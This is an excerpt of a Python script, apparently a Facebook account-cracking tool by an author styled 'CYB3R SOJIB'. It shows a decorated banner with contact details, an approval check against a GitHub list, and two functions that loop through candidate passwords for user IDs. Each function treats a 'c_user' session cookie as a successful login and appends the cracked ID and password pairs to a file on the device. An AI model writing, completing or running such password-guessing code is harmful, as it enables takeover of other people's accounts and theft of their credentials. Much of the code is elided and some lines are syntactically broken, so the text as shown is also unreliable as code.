...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New method By SOJIB")
...
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1mCYB3R SOJIB 6T9 ♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92mNOBITA  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+𝟖𝟖𝟎𝟏879614819 \33[38;5;46m                  ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/K1NG-SOJIB-6T9\33[38;5;46m ▇▎
...
def Main():
	...
	print("\33[97;1m  ❥ 4 ‣  𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐀𝐝𝐦𝐢𝐧 ")
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801879614819');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100074200236579');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/K1NG-SOJIB-6T9 ');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "SOJIB-6T9-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\33[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  ...
  try: 
    httpCaht = requests.get("https://github.com/K1NG-SOJIB-6T9/My-Tools-2.0/blob/main/Aprproved").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93mSOJIB\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/K1nG-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[SOJIB] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}SOJIB{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/k1ng-ok.txt', 'a').write(cid+' | '+ps+'\')
                break
            else:
                continue
        loop+=1        
